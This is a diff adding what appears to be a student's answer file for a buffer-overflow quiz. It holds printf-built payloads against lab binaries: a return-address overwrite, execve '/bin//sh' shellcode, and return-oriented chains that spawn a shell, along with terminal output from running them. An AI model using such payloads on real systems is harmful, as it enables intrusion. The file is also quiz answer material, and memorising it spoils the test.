@@ -1,0 +1,44 @@
+file.1
+
+
+printf "60 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xac\x88\x04\x08" > file.1
+
+
+
+file.2
+
+
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>printf "100 \x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAA\x9a\xe8\xff\xbf" > file.2
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>./run.sh ./bin.2 ./file.2
+Rendering record (size: 100):
+      1 Ph//shh/bin  1 1Ұ
+                         AAAAAAAAAAA(AAAAAAAAAAAA                                            
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>exit
+exit
+
+
+
+
+
+file.3
+
+
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>printf "150 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\x83\x04\x07\x2f\x62\x69\x6e\x58\xa0\x04\x08\xe4\x83\x04\x07\xde\x83\x04\x07\x2f\x2f\x73\x68\x5c\xa0\x04\x08\xe4\x83\x04\x07\xde\x83\x04\x07\x58\xa0\x04\x08AAAA\xe7\x83\x04\x07\xe1\x83\x04\x07\xea\x83\x04\x07\xed\x83\x04\x07\xf0\x83\x04\x07\xf3\x83\x04\x07" > file.3
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>./run.sh ./bin.3 ./file.3
+Rendering record (size: 150):
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(AAAAAAAAAAAAރ/binX ރ//sh\ ރXAAAA                                 
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>exit
+exit
+
+
+
+file.4
+
+
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>printf "150 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\x83\x04\x07\x2f\x62\x69\x6e\x58\xa0\x04\x08\xe4\x83\x04\x07\xde\x83\x04\x07\x2f\x2f\x73\x68\x5c\xa0\x04\x08\xe4\x83\x04\x07\xde\x83\x04\x07AAAA\x60\xa0\x04\x08\xe1\x83\x04\x07\xe4\x83\x04\x07\xde\x83\x04\x07\x58\xa0\x04\x08AAAA\xe7\x83\x04\x07\xe1\x83\x04\x07\xea\x83\x04\x07\xed\x83\x04\x07\xf0\x83\x04\x07\xf3\x83\x04\x07" > file.4
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>./run.sh ./bin.4 ./file.4
+Rendering record (size: 150):
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(AAAAAAAAAAAAރ/binX ރ//sh\ ރAAAA`  ރXAAAA             
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>exit
+exit
+103ws20:/home/students/cs/2022/pbekri01/Downloads/QUIZ2 (5)/1048972>
